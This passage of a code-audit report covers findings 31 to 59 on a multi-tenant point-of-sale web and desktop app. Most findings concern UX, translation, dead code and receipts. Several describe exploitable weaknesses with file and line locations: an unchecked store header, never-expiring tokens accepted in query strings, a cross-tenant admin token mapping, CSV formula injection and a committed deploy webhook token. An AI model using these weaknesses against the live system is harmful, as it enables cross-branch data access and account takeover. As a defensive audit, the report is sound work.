- **Verification:** The finding is real. In desktop/src/hardware/cashDrawer.js, lines 11-22 build an HTML div containing a single '.' and pass it to printerManager.printThermalSilent. The comment on line 6 mentions the ESC p bytes, but no raw ESC/POS bytes are sent anywhere. printerManager.js (lines 29-121) only opens a hidden BrowserWindow and calls webContents.print({silent:true, deviceName}). That is a normal job through the Windows GDI driver. desktop/package.json has no raw transport dependency (serialport, escpos, usb or node-thermal-printer), so there is no other route for the bytes. Every drawer path goes through kickDrawer: the F12/tray/context menu items in main.js (lines 203 and 360), appMenu.js:68, IPC 'hardware:kick-drawer' (main.js:473), the App.vue F12 handler (line 144), the printer settings test (DesktopPrinterSettingsModal.vue:225), and the POS checkout. In PosView.vue (lines 789-792), every cash sale first prints the receipt and then calls openCashDrawer(), which queues a second, almost blank 80mm job. I am lowering the severity from high because there is a common workaround. Most Windows ESC/POS printer drivers (Xprinter, Epson and similar) have an 'open cash drawer before/after printing' setting. With it on, the drawer still opens, on both the receipt and the dummy job. So the drawer does not fail on every install. The guaranteed effects are a wasted blank slip on every cash sale and every F12 press, and no drawer at all on printers without that driver setting. This only affects the Electron desktop shell, not the web or Android POS.

### 32. [MEDIUM] Switching store or user does not reset cached state: stale activeShift, tabs and parked POS carts leak between cashiers and branches
- **Location:** `D:\projects\sroor\backend\resources\js\stores\auth.js:145`
- **Effort:** S
- **Evidence:** switchStore() only sets currentStore and localStorage (auth.js:145-149). SpaLayout.vue:659-663 and DesktopTitlebar.vue:205-209 call it and nothing else, so the visible page and appConfig (activeShift, notifications) are not refetched. clearSession() (auth.js:198-209) does not reset appConfig (isLoaded, tenant, activeShift) or the tabs store. appConfig.fetchBootstrapContext only assigns `if (data.active_shift)` and `if (data.tenant)`, so a null from the server never clears the previous user's shift. usePosOrders.js:7-9 keys parked carts by tenant only (`pos_multi_orders_${tenant}`), not by store or user, and logout never clears them.
- **Impact:** After cashier A logs out and cashier B logs in on the same device, the sidebar can still show A's open shift number (DesktopSidebar.vue:288-296). B also inherits A's parked carts and open tabs. After a branch switch the dashboard and lists keep showing the old branch's data until navigation.
- **Recommendation:** Add an appConfig.$reset() plus tabs reset in a single logout/clearSession path. Assign activeShift/tenant unconditionally (null allowed). After switchStore, re-run fetchBootstrapContext and remount the router view (bump a key). Key parked orders by tenant+store+user and purge them on logout.

### 33. [MEDIUM] X-Store-Id header is trusted without checking the user's store assignment
- **Location:** `D:\projects\sroor\backend\app\Http\Middleware\ApiTokenAuth.php:88`
- **Effort:** S
- **Evidence:** ApiTokenAuth writes session(['current_store_id' => (int)$storeHeader]) for any numeric header. GetSystemContextAction.php:34-36 accepts any active Store id from the header. PosController.php:99 uses the header for storeId. The SPA only offers stores from authStore.stores, but the value comes from localStorage (current_store_id) and is fully client-controlled.
- **Impact:** A cashier restricted to branch A can edit localStorage or the header and read or act on branch B's context (stock, last prices, shift). This breaks the store-isolation rule.
- **Recommendation:** Backend-architect: validate X-Store-Id against $user->stores (or admin) in middleware and return 403 on mismatch. Frontend: on that 403, reset current_store_id to the server-provided store.

### 34. [MEDIUM] Raw axios calls bypass the api client and hit session-auth web routes (dead or broken services)
- **Location:** `D:\projects\sroor\backend\resources\js\Services\posService.js:13`
- **Effort:** S
- **Evidence:** posService.js and customerService.js import axios directly and call '/pos/customer-last-price', '/pos/invoices' and '/pos/customers' with no baseURL, Bearer token, X-Tenant or X-Store-Id. Those paths are web routes under the session `auth` middleware in routes/tenant.php:84-86. posService is imported nowhere. customerService is used only by Components/POS/POSQuickCustomerModal.vue, which is itself not imported anywhere. Composables/useTheme.js:121 does `axios.post('/theme-toggle', ...)` against a session-auth web route (tenant.php:257) without a CSRF token, so the theme preference never persists for bearer-token users.
- **Impact:** Dead code that looks like the official POS service layer. Anyone who wires it up gets 401/419 or HTML responses, and it would post invoices through a second, unaudited path. The theme toggle silently fails to persist server-side.
- **Recommendation:** Delete posService.js, customerService.js and POSQuickCustomerModal.vue, or rewrite them on top of Services/api.js against /api/v1 endpoints. Switch useTheme to api.put on a /api/v1 profile/theme endpoint (ask backend-architect if it is missing).

### 35. [MEDIUM] Import path casing mismatch: 45 imports use 'services/api' but the folder is 'Services'
- **Location:** `D:\projects\sroor\backend\resources\js\stores\auth.js:2`
- **Effort:** S
- **Evidence:** git ls-files lists resources/js/Services/api.js. grep shows 35 imports of '../services/api' and 10 of '../../services/api' (stores/auth.js:2, stores/appConfig.js:2, WorkspaceConnectView.vue, etc.). git core.ignorecase=true. The build passes only because it runs on Windows. .github/workflows/deploy.yml runs on ubuntu-latest and does not build assets, and committed public/build is used instead.
- **Impact:** Any build on a case-sensitive FS (Linux CI, Docker, a Linux dev or build server, or a future CI build step) fails with 'Could not resolve ../services/api'. That blocks releases or forces continued committing of prebuilt assets.
- **Recommendation:** Normalise all imports to '@/Services/api' (alias exists in vite.config.js) and add an ESLint import/no-unresolved check with case sensitivity.

### 36. [MEDIUM] Plan/subscription gating is not enforced in the SPA; FeatureGate is unused and modules are static build-time JSON
- **Location:** `D:\projects\sroor\backend\resources\js\Composables\useModules.js:1`
- **Effort:** M
- **Evidence:** useModules reads `../config/modules.json`, a static file with enabled:true flags, and is not tenant-aware. isRouteEnabled is never called (only defined). router/index.js beforeEach has no module/plan check. Components/FeatureGate.vue reads appConfig.tenant.plan.features and enabled_features but is imported by no component, and it fails open (returns true when tenant or feature is missing). No SPA code reacts to tenant status, trial_ends_at, subscription_ends_at or a 402/423 response.
- **Impact:** Plans configured in the super-admin panel have no effect on the tenant UI. Every tenant sees every module, including the legacy coffee blender. Expired or suspended tenants get only generic error toasts, with no upgrade or renew screen.
- **Recommendation:** Add meta.module to routes and check it in beforeEach against appConfig.tenant.plan.features/enabled_features (fail closed when a tenant exists). Use FeatureGate in navigation (useNavigation) instead of static modules.json. Add a 402/423 handler in api.js that routes to a subscription-expired view. Confirm with backend-architect that the server enforces the same gates.

### 37. [MEDIUM] Auth token in localStorage with no expiry or refresh; legacy plaintext api_token fallback
- **Location:** `D:\projects\sroor\backend\app\Http\Middleware\ApiTokenAuth.php:21`
- **Effort:** M
- **Evidence:** The SPA stores the bearer token in localStorage 'auth_token' (auth.js:55, 91). No config/sanctum.php exists, so expiration defaults to null and tokens never expire. The SPA has no refresh path. ApiTokenAuth also accepts the token via ?api_token query string and falls back to `User::where('api_token', $token)` (ApiQuickLoginAction stores the plaintext token in users.api_token). The central fallback (lines 47-58) maps a central 'admin' user's token to the tenant user with the same phone in any tenant selected via X-Tenant.
- **Impact:** Any XSS or a shared or lost device yields a permanent token. The plaintext DB copy and the query-string transport widen leakage (logs, Referer). The central-admin-by-phone mapping lets a central admin token act inside any tenant.
- **Recommendation:** Backend-architect: set a Sanctum expiration plus sliding refresh, drop the api_token column fallback and query-string tokens, and remove or audit the central->tenant phone mapping. Frontend: handle an expiry 401 cleanly (see the 401 finding) and consider shorter-lived tokens for shared POS devices.

### 38. [MEDIUM] Printed invoices fall back to fake phone, commercial-register and tax numbers
- **Location:** `D:\projects\sroor\backend\resources\js\Composables\useInvoiceShow.js:29`
- **Effort:** S
- **Evidence:** companyInfo uses appConfigStore.tenant?.phone || '01012345678', address || 'الفرع الرئيسي', commercial_register || '123456' and tax_number || '987-654-321'. TenantResource.php does not return address, commercial_register or tax_number at all, so the fake values are always used for those fields.
- **Impact:** Every A4 invoice shows a fabricated commercial register and tax number. For a sellable SaaS this is a legal and compliance problem for customers.
- **Recommendation:** Render these fields only when present. Backend-architect: expose the real company profile (settings) in /system/context.

### 39. [MEDIUM] Client computes and displays money with JS floats; the server response total is not shown back
- **Location:** `D:\projects\sroor\backend\resources\js\views\POS\PosView.vue:451`
- **Effort:** M
- **Evidence:** cartSubtotal, discountAmount, cartNetTotal and changeDue all use parseFloat with plain `*` and `+`. The watch sets cashReceived to `Math.round(newNet)`, so a net of 12.40 shows a negative change (-0.40). For cash payments the server recomputes paid = net (good), but the success modal shows `invoice?.net_amount`, while the print/thermal code reads `net_total || net_amount`. Quantities are sent as raw JS numbers (e.g. 2.3000000000000003 is possible), and the desktop receipt prints `toFixed(2)` on a 3-decimal system.
- **Impact:** Small display mismatches between the POS screen, the server invoice and the receipt. Cashiers see wrong change, and fils are lost on 3-decimal currencies.
- **Recommendation:** Move the cart math into a cart composable that uses integer milli-units or a decimal helper, and round to 3 decimals on output. Do not round cashReceived. After checkout, display the server `net_total`/`paid_amount`/`remaining_amount`. Standardise on one field name (`net_total`).

### 40. [MEDIUM] PosView (839 lines) holds all orchestration; usePOSCart and posService are unused, and posService bypasses api.js
- **Location:** `D:\projects\sroor\backend\resources\js\Composables\usePOSCart.js`
- **Effort:** L
- **Evidence:** Nothing imports usePOSCart.js (110 lines), posService.js or useKeyboardShortcuts.js. usePOSCart keys lines by `item_id` while PosView uses `id`, and it defaults discountType to 'fixed' while PosView defaults to 'percentage'. posService uses raw `axios` against '/pos/invoices', so a revived call would skip the Bearer, X-Tenant and X-Store-Id headers. PosView contains two near-identical debounced search implementations (L308-408), the cart math, payload building, the thermal HTML template (L753-787) and the keyboard handler.
- **Impact:** There are three diverging sources of cart logic, which invites wrong fixes, and the view is about 10x the 80-line target.
- **Recommendation:** Extract: (1) usePOSCart, rebuilt on top of the activeOrder from usePosOrders (all cart computeds, add/inc/dec/qty/price, weight logic); (2) useRemoteSearch(endpoint), a generic debounce+abort helper used twice; (3) usePosCheckout (payload, submit guard, idempotency key, server-total sync); (4) usePosReceipt (desktop/web print strategy); (5) useKeyboardShortcuts for F2/F4/F9/F10. Delete posService or route it through api.js.

### 41. [MEDIUM] Desktop silent print: failure never falls back, the drawer opens anyway, and the receipt ignores tenant print settings
- **Location:** `D:\projects\sroor\backend\resources\js\views\POS\PosView.vue:789`
- **Effort:** M
- **Evidence:** useDesktopHardware.printThermalReceipt catches errors and returns `{success:false}`, and printerManager resolves (does not reject) on failure. PosView awaits without checking the result, then `openCashDrawer()` runs, so the browser fallback inside `catch` is unreachable for print failures. The inline HTML hardcodes Arabic labels, 'ج.م', `شكراً لزيارتكم! ☕` and `toFixed(2)`. It ignores the logo, subtitle, QR, footer and customer-balance settings used by print-thermal.blade.php. Item names and company name are interpolated without HTML escaping into a data: URL BrowserWindow.
- **Impact:** Printer jams or a wrong printer give no receipt and no error, while the drawer still opens. Every tenant gets a coffee-branded, Arabic-only, EGP-only receipt. Item names containing markup can break the receipt layout.
- **Recommendation:** Check `result.success` and alert or fall back. Open the drawer only after a successful print and only for cash. Render the desktop receipt from one shared template driven by tenant settings, with escaped values, `$t` keys and the currency from appConfig.

### 42. [MEDIUM] Three different receipt implementations; the Vue InvoicePrintView has print-CSS and precision defects
- **Location:** `D:\projects\sroor\backend\resources\js\views\Invoices\InvoicePrintView.vue:76`
- **Effort:** M
- **Evidence:** Receipts come from (1) Blade print-thermal (the POS web fallback hits this server route, not the SPA), (2) the SPA InvoicePrintView, and (3) the PosView inline HTML. In InvoicePrintView, quantity is shown via `formatMoney(item.quantity)` (2 decimals). The `@media print { body, html {...} }` rules sit in `<style scoped>`, so they compile to attribute-scoped selectors and never hit body/html. There is no `@page { size: 80mm auto; margin:0 }`. The time is hardcoded `toLocaleTimeString('ar-EG')`, `dir="rtl"` is fixed, and the loading state is a spinner rather than a skeleton. InvoiceShowA4Document.vue:13 renders a lucide `Coffee` icon as the company logo, with `dir="rtl"` hardcoded.
- **Impact:** Receipts differ by device. Browser printing of the SPA receipt uses A4 page margins on thermal printers, weights print rounded, English tenants get RTL Arabic-formatted output, and every tenant's A4 tax invoice shows a coffee cup.
- **Recommendation:** Choose one receipt source (preferably the server-rendered signed URL, or the SPA view fed by a dedicated print payload). Add an unscoped/global `@page` rule, use formatQty with 3 decimals, take dir and locale from the locale store, and use the tenant logo from settings instead of the Coffee icon.

### 43. [MEDIUM] Offline support is a no-op: sw.js is never registered and caches nothing; there is no sale queue
- **Location:** `D:\projects\sroor\backend\public\sw.js`
- **Effort:** XL
- **Evidence:** grep finds no `serviceWorker.register` in resources/. sw.js uses network-first and falls back to `caches.match`, but it never calls `cache.put`, deletes all caches on activate, and still references `/livewire/`. In useNativeBridge, isOnline is only navigator.onLine or a Capacitor Network listener, and useDesktopHardware.isOnline is only rendered in DesktopTitlebar. PosView never reads it, and there is no IndexedDB/outbox. The good part is that the carts persist in localStorage (usePosOrders).
- **Impact:** Any connectivity blip at the counter fails checkout after up to 30 s with a generic error. With no idempotency (see the double-submit finding), retrying risks duplicates. The 'PWA/offline' marketing claim is not backed by code.
- **Recommendation:** Short term: show an offline banner in POS and disable Confirm while offline. Medium term: an outbox (IndexedDB) of orders keyed by idempotency UUID, synced on reconnect, with server-side replay safety. Either remove sw.js or register a real app-shell cache (Vite build assets).

### 44. [MEDIUM] Touch targets below 44px and small type on POS checkout controls
- **Location:** `D:\projects\sroor\backend\resources\js\Components\POS\POSCheckoutPanel.vue`
- **Effort:** S
- **Evidence:** Discount presets use `px-1.5 py-0.5 text-[10px]` (about 20px tall). Payment method chips use `py-1 text-[11px]` (about 26px) and the payment type buttons use `py-1.5` (about 30px). The 'save and print' button is `h-8`, and the cash input is `h-8`. In POSCartTable, qty +/- are `w-9 h-9` (36px), the mobile delete is `min-h-[36px]`, and the mobile price input is `h-8`. The multi-payment button is a bare emoji (`💳`) with no aria-label. The only full-size target is Confirm (`h-11`).
- **Impact:** Mis-taps on POS touch screens and tablets (for example a 15% discount instead of 10%, or credit instead of cash) during rush hours.
- **Recommendation:** Make all interactive controls in POSCheckoutPanel/POSCartTable at least `min-h-11` (44px), use a lucide icon plus aria-label for multi-payment, and enlarge the discount chips into a segmented control.

### 45. [MEDIUM] Barcode-scanner flow can add the wrong item (substring match; remote results arrive after Enter)
- **Location:** `D:\projects\sroor\backend\resources\js\views\POS\PosView.vue:529`
- **Effort:** M
- **Evidence:** searchDropdownResults filters local items by `name.includes(q) || code.includes(q)` with no exact-code priority. Remote search is debounced 250 ms. selectHighlightedOrFirstItem adds `results[highlightedIndex] || results[0]`. A scanner types the code and presses Enter within milliseconds, so only the first 300 preloaded items are searched, and code '12' can match '123' or '512' first.
- **Impact:** Wrong items get sold, or the scan does nothing, for items outside the preloaded 300.
- **Recommendation:** On Enter, look up an exact code/barcode first, with a dedicated `/items/lookup?code=` endpoint if the item is not cached locally. Only fall back to fuzzy search when the user is typing.

### 46. [MEDIUM] Action buttons (cancel invoice, delete item, stock adjust, bulk cancel) are not permission-aware
- **Location:** `D:\projects\sroor\backend\resources\js\Components\Invoices\InvoicesTable.vue:57`
- **Effort:** M
- **Evidence:** Outside POS, only 4 files import useAuthStore: DesktopTitlebar, DesktopSidebar, MobileBottomNav and LoginView. No view or feature component calls hasPermission or can. Permission is checked only per route through router meta.permission (29 entries). InvoicesView.cancelInvoice and bulkCancelSelected, ItemsView delete (line 290) and adjust-stock (line 243), StoresView delete (155) and CategoriesView delete (150) are always shown to everyone who can open the page.
- **Impact:** A cashier with list access sees cancel, delete and adjust buttons. They are rejected at the backend with a 403 Swal, which is bad UX, and if a backend policy is missing anywhere the action simply succeeds.
- **Recommendation:** Add a small `usePermission()` (or v-can directive) wrapping authStore.can, and gate each destructive or financial action in the feature components. Keep the backend policy as the source of truth.

### 47. [MEDIUM] Bulk invoice cancel loops N sequential requests, swallows failures and always reports success; CSV export is injectable
- **Location:** `D:\projects\sroor\backend\resources\js\views\Invoices\InvoicesView.vue:230`
- **Effort:** M
- **Evidence:** bulkCancelSelected runs `for (const id of selectedInvoiceIds) { try { await api.post(`/invoices/${id}/cancel`, { reason: 'إلغاء مجمع من لوحة المبيعات' }) } catch (e) { console.error(...) } }` and then always shows Swal icon 'success'. The reason is hardcoded Arabic. bulkExportSelected and exportToExcel (lines 219, 256) build CSV by string concatenation of customer_name and customer_phone with no quote escaping and no protection against =/+/-/@ formula injection. The headers are hardcoded Arabic, and the export covers only the current page.
- **Impact:** A partial failure looks like full success, so managers believe stock and treasury were reversed when they were not. A customer name like =HYPERLINK(...) runs when the export is opened in Excel, and a name containing a quote breaks the columns.
- **Recommendation:** Move this logic into a useInvoices composable. Use a backend bulk-cancel endpoint, or report succeeded and failed counts with a warning icon. Escape CSV fields (double the quotes, prefix formula characters with '), translate the headers, and let the backend export the full filtered set.

### 48. [MEDIUM] Fat views that fetch and hold business logic, with no composable for Items, Invoices, Stores, Categories, StockTransfers, Dashboard, Auth
- **Location:** `D:\projects\sroor\backend\resources\js\views\Items\ItemsView.vue:79`
- **Effort:** L
- **Evidence:** Non-POS view sizes: LoginView 474, ItemsView 312, InvoicePrintView 289, InvoicesView 270, StoresView 185, StockTransfersView 172, CategoriesView 172, DailyJournalView 153, SettingsView 145, ReportsView 130, WorkspaceConnectView 125, Suppliers/Customers 111, SuperAdminTenants 107, Expenses 105, CoffeeBlender 100. These 9 views import api directly: LoginView:252, WorkspaceConnectView:33, DashboardView:48, InvoicePrintView:157, InvoicesView:60, CategoriesView:50, ItemsView:79, StockTransfersView:56, StoresView:34. Composables/ has no useItems, useCategories, useInvoices, useStores, useStockTransfers, useDashboard or useAuth/useLogin. ItemsView also hardcodes `systemUnits = ref(['كجم','جرام','قطعة',...])` (line 97) even though Units are managed (SuperAdminUnitsView, SettingsUnitsSection).
- **Impact:** The core screens are the least maintainable and hardest to test. The hardcoded unit list ignores tenant-managed units and shows Arabic unit names in English mode, which matters for a by-kilo or wholesale SaaS where units vary by shop.
- **Recommendation:** Extract useItems, useCategories, useInvoices, useStores, useStockTransfers, useDashboard and useLogin following the existing useCustomers/useSuppliers pattern. Load units from the units API.

### 49. [MEDIUM] About 35 dead components and 6 dead composables, including a full duplicate Reports tab set and two update stacks
- **Location:** `D:\projects\sroor\backend\resources\js\Components\Reports\ReportSalesTab.vue:1`
- **Effort:** M
- **Evidence:** Import-graph scan (0 importers): Components/Reports/Report{Customers,Expenses,FilterBar,Inventory,Items,Sales,Stores,Treasury}Tab.vue (8 files, about 670 lines), which duplicate the live Reports*Tab.vue set. Both FilterDrawer.vue copies (root 136 lines and Common 142 lines), FilterToggleButton, SearchBar, StatusBadge, TableRowSkeleton, InvoiceFinancialSummary and InvoiceLineItemsTable (the only user of root SearchableSelect), DashboardAnalytics, FeatureGate, BaseFileUpload, BaseRadioGroup, Settings/{Backup,Branding,System,Telegram,Theme}Tab.vue (replaced by Settings*Section), and POS/{POSCartItem,POSCategoryBar,POSCheckoutSummary,POSCustomerBar,POSCustomerPickerModal,POSItemCard,POSNumpad,POSQuickCustomerModal,POSWeightPickerModal}. Composables with 0 importers: useAppUpdater, useDeleteHandler, useKeyboardShortcuts, usePOSCart, usePOSCategoryColors, useSearchFilter. Update duplication: App.vue mounts root Components/AppUpdateModal.vue (220 lines) with useAppUpdate.js (284 lines, platform-aware via version.json, Capacitor and Electron). Components/Common/AppUpdateModal.vue (96 lines) and useAppUpdater.js (78 lines, hardcoded CURRENT_VERSION_CODE=1, calls '/app/check-version', a route that does not exist in routes/api.php, which defines /app/version and /app/check-update) are dead. Root DatePicker.vue is used only by the dead ReportFilterBar, so BaseDatePicker is canonical. Root ActionMenu.vue (370 lines) is live in 5 tables and has no Common equivalent. Also views/POS/PosView.legacy.grid.vue (1452 lines) is still present.
- **Impact:** Developers and agents edit the wrong copy (two Report tab sets, two update modals, two FilterDrawers), and the bundle and review surface grow. The project's own rule that deletes go through useDeleteHandler is not followed (0 users; deletes are done inline in 12 places).
- **Recommendation:** Delete the dead files listed above (check POSWeightPickerModal with the POS owner first, since by-kilo flows may need it). Move ActionMenu and SearchableSelect into Common/. Remove useAppUpdater.js and Common/AppUpdateModal.vue. Either adopt useDeleteHandler everywhere or drop it from the rules.

### 50. [MEDIUM] Navigation, router titles, layout menus and dashboard hub are hardcoded Arabic, so English mode is mostly Arabic
- **Location:** `D:\projects\sroor\backend\resources\js\Composables\useNavigation.js:37`
- **Effort:** M
- **Evidence:** Non-comment Arabic literal lines by file: DashboardAppMenuHub.vue 43 (e.g. line 126 `{ id: 'all', label: 'الكل' }`), router/index.js 40 (meta.title such as 'تسجيل الدخول', used for document.title at line 435), SpaLayout.vue 40 (line 14 title='القائمة', line 52 'الملف الشخصي والأمان', role fallback 'المدير العام'), useNavigation.js 34 (all section titles and subtitles), DesktopSidebar 17, useInvoiceShow 16 (company fallbacks and WhatsApp share text), useBiometricAuth 16, DesktopTitlebar 15, useAppUpdate 14, helpers/alert.js 9 (default confirm texts), LoginView 10, UploadApkModal 9, Form/BaseSelect 4 ('اختر من القائمة...', 'بحث...', 'جاري التحميل...'). Fallback strings like trans(...) || '...' appear only 4 times (InvoicesView x3, ItemsView x1), and they never fire because trans() returns the key when a key is missing (helpers/trans.js:57).
- **Impact:** An English-speaking tenant sees an Arabic sidebar, menu hub, page titles, dropdown placeholders and confirm dialogs. That defeats the ar/en promise of the generic SaaS.
- **Recommendation:** Move these strings into lang/{ar,en}/nav.php, common.php and so on. Store translation keys in router meta and navigation config and translate them at render time. Remove the dead || fallbacks.

### 51. [MEDIUM] 45 translation keys used in the UI do not exist in lang/, so raw keys render (super-admin create-tenant modal, reports empty states, close-shift)
- **Location:** `D:\projects\sroor\backend\resources\js\Components\SuperAdmin\CreateTenantModal.vue:1`
- **Effort:** S
- **Evidence:** I extracted 1752 unique literal keys from $t/t/trans calls and resolved each against lang/ar/*.php. 45 are missing, for example super.db_host_label, super.db_name_label, super.db_user_label, super.db_pass_label, super.custom_db_warning, super.initial_password_label, super.status_pending, super.status_cancelled, reports.no_data_title, reports.no_data_desc, reports.total_sales, treasury.drawer_surplus, treasury.drawer_balanced, common.save_changes (only profile.save_changes exists), common.details, common.saving, common.server_error, contacts.save_customer, contacts.save_supplier, invoices.payment_ewallet, inventory.cancel_transfer. Used in CreateTenantModal, Reports*Tab, CloseShiftModal, CategoryFormModal, CustomerFormModal, StoreFormModal and others. Apart from that, ar/en parity is good: the same 25 files, and only validation.php differs (ar 188 keys vs en 138: attributes.* missing in en, 9 newer Laravel rules missing in ar).
- **Impact:** Users and super-admins see strings like 'super.db_host_label' and 'common.save_changes' on save buttons and in the tenant-creation form.
- **Recommendation:** Add the 45 keys to both lang/ar and lang/en, sync validation.php, then run php artisan lang:export. Add a CI script (like the scan used here) that fails on unknown keys.

### 52. [MEDIUM] About 129 physical-direction utilities in shared form and layout primitives break English (LTR)
- **Location:** `D:\projects\sroor\backend\resources\js\Components\Form\BaseInput.vue:19`
- **Effort:** M
- **Evidence:** Non-POS physical utility counts per file: InvoiceShowA4Document 14, LoginView 12, SpaLayout 8, Form/BaseSelect 8, SuperAdminLayout 7, Common/SearchBar 7, SearchableSelect 6, ReportSalesTab 6, BaseNumberInput 5, BaseInput 5, WorkspaceStepInput 5, ActionMenu 5, BaseSearchInput 4, DatePicker 4. That is 129 in total, against 392 logical utilities. Examples: BaseInput.vue:19 'absolute right-3.5' leading icon with ':49 pr-10' and ':60 absolute left-3' trailing; BaseSelect.vue:94 'text-right'; SpaLayout.vue:39 and :138 dropdowns 'absolute right-0'; SpaLayout.vue:280 mobile drawer 'fixed inset-y-0 right-0 ... border-l'.
- **Impact:** In English mode, every BaseInput, BaseSelect and BaseNumberInput icon sits on the wrong side, overlaps the text, and the select options stay right-aligned. Because these are shared primitives, every form in the app is affected.
- **Recommendation:** Convert to logical utilities (start-3.5 / end-3, ps-10 / pe-10, text-start, ms-/me-, border-e, start-0/end-0), beginning with Components/Form/* and SpaLayout.

### 53. [MEDIUM] Deploy webhook token hardcoded in the CI workflow
- **Location:** `D:\projects\sroor\.github\workflows\deploy.yml:49`
- **Effort:** S
- **Evidence:** The deploy step curls the production update_webhook.php URL with a literal token query parameter (a deployment webhook secret, committed in plain text). Value not reproduced.
- **Impact:** Anyone with read access to the repo can trigger production deploys. Outside my sub-area; flagged for the security/devops lead.
- **Recommendation:** Rotate the token, move it to GitHub Secrets, and have the webhook verify an HMAC.

### 54. [MEDIUM] Super-admin lifecycle gaps for a sellable SaaS
- **Location:** `D:\projects\sroor\backend\resources\js\Composables\useSuperAdminTenantShow.js:159`
- **Effort:** L
- **Evidence:** Endpoint map: Tenants view uses GET/POST /super-admin/tenants, POST {id}/toggle-status and DELETE {id}. Tenant show uses GET {id}, POST {id}/override-feature, {id}/update-units, {id}/run-migrations, {id}/toggle-status and DELETE {id}. Plans view uses GET /plans and PUT /plans/{id}. Units view uses GET/POST /units. App versions uses GET/POST /app-versions, PATCH {id}/toggle-active and DELETE {id}. Dashboard uses GET /dashboard and GET/POST /settings. Every frontend call has a matching route. Missing: changing the plan of an existing tenant (no endpoint, no UI), creating plans, domain management, and impersonation (ImpersonateTenantAction exists but has no route or UI). Unused: POST {id}/update-db-config. ToggleTenantStatusAction updates tenants.status and subscription_ends_at only and never writes a Subscription row. There are no billing or payment records, no scheduled expiry job (routes/console.php has none) and no renewal reminders. Usage stats show counts only, with no limits. total_sales sums all invoices with float number_format, including cancelled ones.
- **Impact:** Upgrades and downgrades, billing history, custom domains and support login all require manual DB work. Expiry is never applied automatically.
- **Recommendation:** Spec for backend-architect: PUT /super-admin/tenants/{id}/plan, CRUD for domains, a subscriptions/payments ledger, a scheduled tenants:expire command plus reminders, and an impersonate route that writes an audit log. Show usage against plan limits (users, stores, items) in TenantStatsGrid.

### 55. [MEDIUM] No first-run setup wizard; onboarding stops at workspace code then login
- **Location:** `D:\projects\sroor\backend\resources\js\views\Auth\WorkspaceConnectView.vue:56`
- **Effort:** L
- **Evidence:** Workspaces are found by code, slug, id or domain through GET /central/tenants/resolve?code=, or by a ?tenant= magic link. The result is stored in localStorage as active_tenant, tenant_id, tenant_name, tenant_server_url and tenant_domain, and in Electron settings. A grep for onboarding, setup wizard or first_run finds nothing. The central-host check hardcodes 'baraa-solutions.com' (also in LoginView isCentralHub). A suspended workspace returns 403 from the resolver but is shown only as a generic error message.
- **Impact:** A new tenant lands on an empty dashboard with no guided store, units, opening stock or opening balances. That raises support load and churn. Hardcoded hosts break white-label or self-hosted deployments.
- **Recommendation:** Add an onboarding flow (store and branch, units, tax and currency, opening cash, first items import) triggered by a backend 'setup_completed' flag in /system/context. Move central domains into config exposed by the API.

### 56. [MEDIUM] Coffee and Sroor branding hardcoded across tenant-facing UI and devices
- **Location:** `D:\projects\sroor\backend\resources\js\Components\Invoices\Show\InvoiceShowA4Document.vue:13`
- **Effort:** M
- **Evidence:** Hardcoded brand cases: the Coffee lucide icon is used as the logo in InvoiceShowA4Document:13 (printed customer invoice), DesktopSidebar:15/44, SpaLayout:290, SuperAdminLayout:92, DesktopTitlebar:10, DashboardWelcomeBanner:6 and WorkspaceConnectingState:13. capacitor.config.json has appId com.sroor.cofe.erp, appName 'منظومة سرور كوفي ERP' and server.url pinned to one tenant host (2m.baraa-solutions.com) with cleartext:true. WorkspaceConnectingState:77 uses the sroor:// deep link. useAppUpdate.js:190 falls back to Sroor-ERP-POS-Setup.exe. SpaLayout:624 has a demo notification about 'بن الأصيل'. Coffee-only features that should be a plan module: the CoffeeBlender view, composable and components, the /coffee-blender route, DashboardAppMenuHub:272-277 (hardcoded subtitle 'معمل البن والإنتاج'), useNavigation:157 (hardcoded title 'صانع الخلطات وتوليفات البن'), tabs.js:48, and roast options in useCoffeeBlender.js:18-36 that send Arabic literals ('وسط') as data values. Generic-able labels: POSItemCard and POSCartItem comments, useReports:23 Coffee icon for items, DynamicIcon emoji map, and ThemeTab. In lang files most values are already generic ('تجميع الأصناف', 'Product Blender & Assembly'), but key names stay coffee_* or roast_*. Coffee or roastery text remains in en/settings.php:123, en/super.php:91 and 102, en/inventory.php:354 and ar/inventory.php:398. ar/inventory.php also defines roast_light..roast_double twice (lines 121-124 and 157-160).
- **Impact:** Every tenant (a grocery, a wholesale shop) prints invoices with a coffee-cup logo and sees coffee wording. The Android build is tied to one tenant's host, so it cannot be a generic store app.
- **Recommendation:** Replace the brand icon with the tenant logo from appConfig.branding (with a neutral Store icon fallback). Gate blender behind a 'product_assembly' plan feature and rename the keys. Make the Capacitor host neutral (central /connect) and the app id generic. Drop cleartext:true.

### 57. [MEDIUM] Per-tenant logo is loaded but never rendered
- **Location:** `D:\projects\sroor\backend\resources\js\stores\appConfig.js:13`
- **Effort:** S
- **Evidence:** appConfig.branding (logo, logo_light, logo_dark) is filled from /system/context, but a grep for 'branding.' or 'branding?' across resources/js finds no consumer. Company name and subtitle are per-tenant and used in DesktopSidebar and the invoice. The store defaults ('مؤسسة تجارية', 'منظومة ERP السحابية') and LoginView titles are hardcoded Arabic literals, not translation keys.
- **Impact:** Tenants cannot white-label with their own logo on screen or on printed invoices, which is a basic expectation for a paid POS SaaS.
- **Recommendation:** Create a shared BrandMark component that renders branding.logo for light and dark with a fallback icon. Use it in the sidebar, titlebar, login, workspace-connect and A4/thermal print.

### 58. [MEDIUM] 45 imports use '../services/api' while the tracked folder is 'Services'
- **Location:** `D:\projects\sroor\backend\resources\js\views\Auth\WorkspaceConnectView.vue:35`
- **Effort:** S
- **Evidence:** `git ls-files` shows resources/js/Services/api.js. 45 files (including appConfig.js, LoginView.vue and WorkspaceConnectView.vue) import '/services/api'. core.ignorecase=true on this Windows checkout hides the mismatch.
- **Impact:** `npm run build` fails on any case-sensitive filesystem (Linux CI, Hostinger, Docker). That blocks reproducible builds outside this Windows machine.
- **Recommendation:** Normalize every import to '@/Services/api'. Add a CI build on Linux.

### 59. [MEDIUM] Session token passed in the URL query to /telescope-access
- **Location:** `D:\projects\sroor\backend\resources\js\Layouts\SuperAdminLayout.vue:31`
- **Effort:** S
- **Evidence:** telescopeUrl = `/telescope-access?token=${encodeURIComponent(localStorage auth_token)}`. routes/web.php accepts the token, also allows hasRole('admin') or any email ending in @baraa-solutions.com, and logs in the web guard with remember=true.
- **Impact:** The super-admin bearer token leaks into access logs, browser history and Referer headers. Telescope exposes request payloads for all tenants.
